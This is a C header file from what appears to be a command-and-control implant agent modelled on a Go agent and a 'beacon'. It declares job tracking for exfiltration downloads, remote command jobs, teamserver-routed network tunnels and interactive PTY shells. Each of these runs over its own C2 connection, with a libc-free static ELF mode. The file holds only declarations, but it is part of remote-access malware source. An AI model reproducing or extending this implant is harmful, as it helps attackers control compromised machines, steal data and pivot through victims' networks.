#ifndef JOBS_H
#define JOBS_H

#include "types.h"
#include "connector.h"
#include "msgpack.h"
#include <stdint.h>

/// Threading abstraction:
/// - BUILD_SO mode: uses R_pthread_create/mutex from resolved libc
/// - Static ELF mode: uses clone() with mmap'd stack (no libc)

#ifndef _PTHREAD_TYPES_DEFINED
#define _PTHREAD_TYPES_DEFINED
typedef unsigned long pthread_t;
typedef struct { volatile int __lock; } pthread_mutex_t;
#endif

/// Job management system -- async tasks via threads
/// Matches Go agent's DOWNLOADS, JOBS, TUNNELS, TERMINALS maps

#define MAX_JOBS        32
#define MAX_TUNNELS     16
#define MAX_TERMINALS   8

/// Job types (maps to pack types)
#define JOB_TYPE_DOWNLOAD  EXFIL_PACK   /* 2 */
#define JOB_TYPE_RUN       JOB_PACK     /* 3 */
#define JOB_TYPE_TUNNEL    JOB_TUNNEL   /* 4 */
#define JOB_TYPE_TERMINAL  JOB_TERMINAL /* 5 */

/// Job state
typedef struct {
    char        job_id[64];       /* task ID (hex string from server) */
    int         job_type;         /* JOB_TYPE_* */
    int         active;           /* 1 = running, 0 = finished/canceled */
    int         canceled;         /* 1 = cancel requested */
    pthread_t   thread;           /* worker thread */
    connector_t conn;             /* separate C2 connection for this job */
} job_entry_t;

/// Tunnel controller -- MUX model (data flows in main channel, no separate C2 connection)
/// Follows beacon's Proxyfire pattern: non-blocking polling in main loop.
#define TUNNEL_STATE_CONNECTING  0
#define TUNNEL_STATE_READY       1
#define TUNNEL_STATE_CLOSED      2

#define TUNNEL_HIGH_WATERMARK    (4 * 1024 * 1024)   /* 4 MB: send PAUSE to teamserver */
#define TUNNEL_LOW_WATERMARK     (1 * 1024 * 1024)   /* 1 MB: send RESUME to teamserver */
#define TUNNEL_HARD_CAP          (16 * 1024 * 1024)   /* 16 MB: kill channel */
#define TUNNEL_CONNECT_TIMEOUT   30                    /* seconds */

typedef struct {
    int         channel_id;
    int         active;
    int         paused;           /* teamserver told us to stop reading from target */
    int         client_fd;        /* socket to target (non-blocking) */
    int         state;            /* TUNNEL_STATE_* */
    uint8_t    *write_buf;        /* data from teamserver → target socket */
    uint32_t    write_len;
    uint32_t    write_cap;
    int         agent_paused;     /* we sent PAUSE to teamserver (backpressure) */
    uint32_t    connect_start;    /* monotonic timestamp for connect timeout */
} tunnel_entry_t;

/// Terminal controller
typedef struct {
    int         term_id;
    int         active;
    int         canceled;
    pthread_t   thread;
    connector_t srv_conn;         /* connection to C2 */
    int         pty_master;       /* PTY master fd */
    int         child_pid;        /* shell process pid */
} terminal_entry_t;

/// Upload staging (synchronous -- data received in command loop)
typedef struct {
    char     task_id[64];
    uint8_t *data;
    size_t   data_len;
    size_t   data_cap;
} upload_entry_t;

/// Global job context -- shared state needed by async threads
typedef struct {
    /* Agent identity (for init packs) */
    uint32_t  agent_id;
    uint32_t  profile_type;
    uint8_t   enc_key[16];       /* profile encryption key */
    uint8_t   session_key[16];   /* session key (SKey) */

    /* Connection info for spawning new connections */
    char      address[256];      /* current C2 address */
    int       banner_size;       /* banner to discard on new connections */

    /* Job tracking */
    job_entry_t      jobs[MAX_JOBS];
    int              job_count;
    pthread_mutex_t  jobs_mutex;

    /* Tunnel tracking */
    tunnel_entry_t   tunnels[MAX_TUNNELS];
    int              tunnel_count;
    pthread_mutex_t  tunnels_mutex;

    /* Terminal tracking */
    terminal_entry_t terminals[MAX_TERMINALS];
    int              terminal_count;
    pthread_mutex_t  terminals_mutex;

    /* Upload staging */
    upload_entry_t   uploads[MAX_JOBS];
    int              upload_count;
} job_context_t;

/// Initialize job context (call once at startup)
void jobs_init(job_context_t *ctx);

/// Update connection info when profile/address changes
void jobs_update_connection(job_context_t *ctx, const char *address,
                            int banner_size, const uint8_t *enc_key,
                            uint32_t profile_type);

/// Open a new C2 connection for an async job
int jobs_open_connection(job_context_t *ctx, connector_t *conn);

/// Find a free job slot (returns index or -1)
int jobs_alloc(job_context_t *ctx);

/// Find job by ID (returns index or -1)
int jobs_find(job_context_t *ctx, const char *job_id);

/// Remove job by index
void jobs_remove(job_context_t *ctx, int idx);

/// Find tunnel by channel_id
int tunnels_find(job_context_t *ctx, int channel_id);

/// Find terminal by term_id
int terminals_find(job_context_t *ctx, int term_id);

/// Build and send a job message on a separate connection
int jobs_send_message(job_context_t *ctx, connector_t *conn,
                      uint32_t command_id, const char *job_id,
                      const uint8_t *data, uint32_t data_len);

/// Build and send the init pack for an async job
int jobs_send_init(job_context_t *ctx, connector_t *conn,
                   int pack_type, const uint8_t *pack_data, uint32_t pack_len);

/// Create a detached thread running fn(arg). Returns 0 on success.
/// Uses pthread in SO mode, clone()+mmap stack in static mode.
int jobs_thread_create(pthread_t *tid, void *(*fn)(void*), void *arg);

/// Mutex operations (pthread in SO mode, spinlock in static mode)
void jobs_mutex_init(pthread_mutex_t *m);
void jobs_mutex_lock(pthread_mutex_t *m);
void jobs_mutex_unlock(pthread_mutex_t *m);

/// Global job context (set in main.c)
extern job_context_t g_job_ctx;

#endif /* JOBS_H */
